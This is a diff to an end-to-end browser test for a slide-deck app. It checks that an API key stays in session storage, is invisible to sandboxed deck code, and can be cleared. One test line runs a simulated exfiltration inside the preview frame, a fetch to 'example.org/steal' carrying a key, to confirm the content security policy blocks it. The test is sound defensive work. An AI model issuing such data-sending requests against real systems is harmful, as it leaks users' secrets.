@@ -87,6 +87,34 @@ try {
   check('deck code cannot read the app (opaque origin)', isolated);
   check('preview iframe is sandboxed to scripts only', (await page.locator('iframe[title="Deck preview"]').getAttribute('sandbox')) === 'allow-scripts');
 
+  /* 3b. Keys: session only by default, and out of reach of deck code */
+  await page.getByRole('button', { name: 'Settings' }).click();
+  await page.fill('#set-key', 'sk-ant-e2e-secret');
+  check('remember is off by default and warns when switched on', !(await page.locator('#set-remember').isChecked()) && (await page.locator('.notice.warn').count()) === 0);
+  await page.locator('#set-remember').check();
+  check('switching remember on shows the warning', await page.locator('.notice.warn').isVisible());
+  await page.locator('#set-remember').uncheck();
+  await page.getByRole('button', { name: 'Save settings' }).click();
+  const stores = await page.evaluate(() => ({ local: localStorage.getItem('deckhack.settings') ?? '', session: sessionStorage.getItem('deckhack.settings') ?? '' }));
+  check('the key is kept for the tab session only', stores.session.includes('sk-ant-e2e-secret') && !stores.local.includes('sk-ant-e2e-secret'));
+  const frame = page.frameLocator('iframe[title="Deck preview"]').locator('body');
+  const seen = await frame.evaluate(() => {
+    const dump = (s) => { try { return JSON.stringify(Object.assign({}, s)); } catch { return ''; } };
+    return dump(window.localStorage) + dump(window.sessionStorage) + document.cookie;
+  }).catch(() => '');
+  check('deck code sees no key in its own storage', !seen.includes('sk-ant'));
+  const blocked = await frame.evaluate(() => new Promise((resolve) => {
+    document.addEventListener('securitypolicyviolation', (e) => resolve(e.violatedDirective), { once: true });
+    fetch('https://example.org/steal?key=x').catch(() => {});
+    setTimeout(() => resolve('not blocked'), 3000);
+  }));
+  check('deck code cannot send data to other servers (CSP)', /connect-src/.test(blocked), blocked);
+  await page.getByRole('button', { name: 'Settings' }).click();
+  await page.getByRole('button', { name: 'Remove stored keys' }).click();
+  const cleared = await page.evaluate(() => (localStorage.getItem('deckhack.settings') ?? '') + (sessionStorage.getItem('deckhack.settings') ?? ''));
+  check('"Remove stored keys" clears the key', !cleared.includes('sk-ant'));
+  await page.evaluate(() => { sessionStorage.clear(); localStorage.clear(); });
+
   /* 4. Versions: go back without losing history */
   await page.getByRole('tab', { name: /Versions/ }).click();
   check('two versions are listed', (await page.locator('.version').count()) === 2);
